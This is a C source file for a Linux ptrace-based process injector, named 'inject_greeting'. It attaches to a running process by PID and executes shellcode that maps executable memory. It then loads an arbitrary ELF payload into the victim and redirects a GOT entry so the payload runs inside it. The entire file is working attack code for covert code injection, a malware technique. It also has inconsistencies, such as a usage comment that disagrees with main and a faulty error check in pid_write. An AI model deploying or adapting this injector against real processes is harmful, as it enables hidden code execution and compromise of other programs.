/* inject_greeting.c */
/* gcc inject_greeting.c -o inject_greeting */
/* Usage: inject_greeting <pid> */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <elf.h>
#include <fcntl.h>
#include <string.h>
#include <sys/ptrace.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <sys/types.h>
#include <sys/errno.h>

#define WORD_ALIGN(x) (x + 7)&(~7)
#define BASE_ADDRESS 0x100000

typedef struct handle
{
    pid_t pid;                      // PID of target process

    uint64_t base_addr;             // base address of target process
    Elf64_Ehdr *ehdr;               // ELF header of target process
    Elf64_Phdr *phdr;               // program header of target process

    char *executable;               // payload

    struct user_regs_struct pt_reg; // Register of target process
    
    uint8_t *shellcode;             // Address of shellcode

    uint64_t inject_addr;           // Address where we inject the shellcode
    uint64_t payload_entry;         // entry of payload
}handle_t;

static inline volatile long
print_string(int, char *, unsigned long)__attribute__((aligned(8), __always_inline__));
static inline volatile void *
evil_mmap(void *, size_t, int, int, int64_t, uint64_t)__attribute__((aligned(8), __always_inline__));
uint64_t injected_code() __attribute__((aligned(8)));
int pid_read(pid_t, const void *, const void *, size_t);
int pid_write(pid_t, const void *, const void *, size_t);
uint8_t *create_shellcode(void (*fn)(), size_t len);
uint64_t get_inject_addr(handle_t *);

uint64_t f1 = (uint64_t)injected_code;
uint64_t f2 = (uint64_t)pid_read;

// Assembly code for write(1, buf, len)
static inline volatile long
print_string(int fd, char *buf, unsigned long len)
{
    long ret;
    __asm__ volatile(
        "mov %1, %%edi\n"
        "mov %2, %%rsi\n"
        "mov %3, %%rdx\n"
        "mov $1, %%rax\n"
        "syscall\n"
        "mov %%rax, %0\n"
        : "=r"(ret)
        : "g"(fd), "g"(buf), "g"(len)
    );
    return ret;
}

static inline volatile void * 
evil_mmap(void *addr, size_t length, int prot, int flags, int64_t fd, uint64_t offset)
{
    void *ret;
    __asm__ volatile(
        "mov %1, %%rdi\n"
        "mov %2, %%rsi\n"
        "mov %3, %%edx\n"
        "mov %4, %%ecx\n"
        "mov %5, %%r8\n"
        "mov %6, %%r9\n"
        "mov $9, %%rax\n"
        "syscall\n"
        "mov %%rax, %0"
        : "=r"(ret)
        : "g"(addr), "g"(length), "g"(prot), "g"(flags), "g"(fd), "g"(offset)  
    );
    return ret;
}

uint64_t injected_code()
{
    evil_mmap(NULL, 0x4000, 
    PROT_READ|PROT_WRITE|PROT_EXEC, 
    MAP_ANONYMOUS|MAP_FIXED|MAP_PRIVATE, 
    -1, 0);
    __asm__ volatile("int3");
    
    /*
    char str[] = {'[', 'I', '\'', 'm', ' ', 'i', 'n', ' ', 'h', 'e', 'r', 'e', ']','\n', '\0'};
    print_string(1, str, 14);
    __asm__ volatile("int3");
    */
}

// Duplicate the function (shellcode) to a heap address space
uint8_t *create_shellcode(void (*fn)(), size_t len)
{
    int i;
    uint8_t *shellcode = (uint8_t *)malloc(len);
    uint8_t *ptr = (uint8_t *)fn;
    for(i = 0; i < len; i++) *(shellcode + i) = *(ptr + i);
    return shellcode;
}

// Read len bytes from the src to dst in process specifed by pid
int pid_read(pid_t pid, const void *dst, const void *src, size_t len)
{
    int times = len / sizeof(long);
    void *s = (void *)src;
    void *d = (void *)dst;
    int i;
    for(i = 0; i < times; i++)
    {
        long word;
        if((word = ptrace(PTRACE_PEEKTEXT, pid, s, NULL)) == -1 && errno)
        {
            fprintf(stderr, "pid_read failed, pid: %d: %s\n", pid, strerror(errno));
            perror("PTRACE_PEEKTEXT");
            return 1;
        }
        memcpy(d, &word, sizeof(long));
        s += sizeof(long);
        d += sizeof(long);
    }
    return 0;
}

// Write len bytes from the src to dst in processs specified by pid
int pid_write(pid_t pid, const void *dst, const void *src, size_t len)
{
    int times = len / sizeof(long);
    void *s = (void *)src;
    void *d = (void *)dst;
    int i;
    for(i = 0; i < times; i++)
    {
        if(ptrace(PTRACE_POKETEXT, pid, d, *(void **)s) == 1)
        {
            fprintf(stderr, "pid_write failed, pid: %d: %s\n", pid, strerror(errno));
            perror("PTRACE_POKETEXT");
            return 1;
        }
        s += sizeof(void *);
        d += sizeof(void *);
    }
    return 0;
}

/* Obtain the inject address by referring program header, 
*  hence the host program should be compiled with -no-pie. */ 
uint64_t get_inject_addr(handle_t *h)
{
    uint64_t inject_addr = 0;
    char maps[512], buffer[64];
    FILE *fd;
    snprintf(maps, 512, "/proc/%d/maps", h->pid);
    if((fd = fopen(maps, "r"))  == NULL)
    {
        perror("fopen");
        return 1;
    }
    if(fgets(buffer, 64, fd) < 0)
    {
        perror("fgets");
        exit(-1);
    }
    fclose(fd);
    char* base_str = strtok(buffer, "-");
    h->base_addr = strtoul(base_str, NULL, 16);
    
    uint8_t *mem = malloc(sizeof(Elf64_Ehdr));
    if(mem == MAP_FAILED)
    {
        perror("mmap");
        exit(-1);
    }
    if(pid_read(h->pid, mem, (void *)h->base_addr, sizeof(Elf64_Ehdr)) < 0)
    {
        perror("ptrace");
        exit(-1);
    }
    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)mem;
    size_t phdr_size = ehdr->e_phentsize * ehdr->e_phnum;
    free(mem);
    
    mem = malloc(sizeof(Elf64_Ehdr) + phdr_size);
    if(mem == MAP_FAILED)
    {
        perror("mmap");
        exit(-1);
    }
    if(pid_read(h->pid, mem, (void *)h->base_addr, sizeof(Elf64_Ehdr) + phdr_size) < 0)
    {
        perror("ptrace");
        exit(-1);
    }
    h->ehdr = (Elf64_Ehdr *)mem;
    h->phdr = (Elf64_Phdr *)&mem[ehdr->e_phoff];
    int i;
    for(i = 0; i < ehdr->e_phnum; i++)
    {
        if((h->phdr[i].p_type == PT_LOAD)&&(h->phdr[i].p_flags == PF_R + PF_X))
        {
            inject_addr = h->phdr[i].p_vaddr + h->phdr[i].p_memsz;
            break;
        }
    }
    return inject_addr;
}

void got_redirection(handle_t h)
{
    int i;
    uint64_t dynamic_addr;
    size_t dynamic_size;
    uint64_t got_addr;
    for(i = 0; i < h.ehdr->e_phnum; i++)
    {
        if(h.phdr[i].p_type == PT_DYNAMIC)
        {
            dynamic_addr = h.phdr[i].p_vaddr;
            dynamic_size = h.phdr[i].p_memsz;
            break;
        }
    }
    Elf64_Dyn *dyn = malloc(dynamic_size);
    if(pid_read(h.pid, dyn, (void *)dynamic_addr, dynamic_size) < 0)
    {
        perror("ptrace");
        exit(-1);
    }
    for(i = 0; dyn[i].d_tag != DT_NULL; i++)
    {
        if(dyn[i].d_tag == DT_PLTGOT)
        {
            got_addr = dyn[i].d_un.d_ptr + 4 * sizeof(uint64_t);
            break;
        }
    }
    printf("GOT redirection address: %lx\n", got_addr);
    if(pid_write(h.pid, (void *)got_addr, &h.base_addr, sizeof(uint64_t)) < 0)
    {
        perror("ptrace");
        exit(-1);
    }
}


int main(int argc, char *argv[])
{
    // Processing commandline arguments
    if(argc != 3)
    {
        printf("Usage: %s <PID> <payload>\n", argv[0]);
        exit(EXIT_SUCCESS);
    }
    handle_t h;
    h.pid = atoi(argv[1]);
    h.executable = strdup(argv[2]);
    int status;
    
    // Attach to target process
    if(ptrace(PTRACE_ATTACH, h.pid, NULL, NULL) < 0)
    {
        fprintf(stderr, "Failed to attach to the target process %d: %s\n", h.pid, strerror(errno));
        exit(EXIT_FAILURE);
    }
    wait(&status);
    printf("Attached to the target process.\n");
    if((h.inject_addr = get_inject_addr(&h)) == 0)
    {
        printf("Failed to get the injection address.\n");
        exit(EXIT_FAILURE);
    }
    printf("Got the inject address: %lx\n", h.inject_addr);
    size_t shell_size = f2 - f1;
    shell_size += 8;
    
    // Generate the shell code in heap address space
    h.shellcode = create_shellcode((void *)(injected_code), shell_size);
    
    // Inject the shellcode to the host at inject address
    if(ptrace(PTRACE_GETREGS, h.pid, NULL, &h.pt_reg) < 0)
    {
        fprintf(stderr, "Failed to get the registers of target process %d: %s\n", h.pid, strerror(errno));
        exit(EXIT_FAILURE);
    }
    uint64_t old_rip = h.pt_reg.rip;
    uint64_t old_rsp = h.pt_reg.rsp;
    uint64_t old_rbp = h.pt_reg.rbp;

    if(pid_write(h.pid, (void *)h.inject_addr, (void *)h.shellcode, shell_size) == 1)
    {
        printf("Failed to write shellcode\n");
        exit(EXIT_FAILURE);
    }

    h.pt_reg.rip = h.inject_addr;
    
    if(ptrace(PTRACE_SETREGS, h.pid, NULL, &h.pt_reg) < 0)
    {
        fprintf(stderr, "Failed to set the registers of target process %d: %s\n", h.pid, strerror(errno));
        exit(EXIT_FAILURE);
    }

    // Start the target process
    if(ptrace(PTRACE_CONT, h.pid, NULL, NULL) < 0)
    {
        fprintf(stderr, "Failed to restart the target process %d: %s\n", h.pid, strerror(errno));
        exit(EXIT_FAILURE);
    }

    wait(&status);
    if(WSTOPSIG(status) != SIGTRAP)
    {
        printf("Something went wrong.\n");
        exit(EXIT_FAILURE);
    }else
    {
        printf("Shellcode has been injected and executed.\n");
        if(ptrace(PTRACE_GETREGS, h.pid, NULL, &h.pt_reg) < 0)
        {
            perror("PTRACE_GETREGS");
            exit(EXIT_FAILURE);
        }
        printf("return value of shellcode: 0x%llx\n", h.pt_reg.rax);
        if(h.pt_reg.rax != BASE_ADDRESS)
        {
            perror("mmap");
            exit(-1);
        }
    }
    
    int fd;
    if((fd = open(h.executable, O_RDONLY)) < 0)
    {
        perror("open");
        exit(-1);
    }
    struct stat st;
    if((fstat(fd, &st)) < 0)
    {
        perror("fstat");
        exit(-1);
    }
    uint8_t *mem = mmap(NULL, WORD_ALIGN(st.st_size), PROT_READ, MAP_PRIVATE, fd, 0);
    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)mem;
    h.payload_entry = h.pt_reg.rax + ehdr->e_entry;

    if(pid_write(h.pid, (void *)BASE_ADDRESS, mem, WORD_ALIGN(st.st_size)) < 0)
    {
        printf("Failed to load the payload.\n");
        exit(-1);
    }
    
    got_redirection(h);

    // Set the PC of host to the payload
    h.pt_reg.rip = old_rip;
    h.pt_reg.rbp = old_rbp;
    h.pt_reg.rsp = old_rsp;
    /* Note that current rbp = 0*/
    
    // printf("%llx    %lx\n", h.pt_reg.rbp, old_rbp);
    // printf("%llx    %lx\n", h.pt_reg.rsp, old_rsp);
    
    if(ptrace(PTRACE_SETREGS, h.pid, NULL, &h.pt_reg) < 0)
    {
        perror("PTRACE_SETREGS");
        exit(EXIT_FAILURE);
    }

    // Detaching to make the target process run
    if(ptrace(PTRACE_DETACH, h.pid, NULL, NULL) < 0)
    {
        perror("PTRACE_CONT");
        exit(EXIT_FAILURE);
    }
    wait(NULL);

    return 0;
}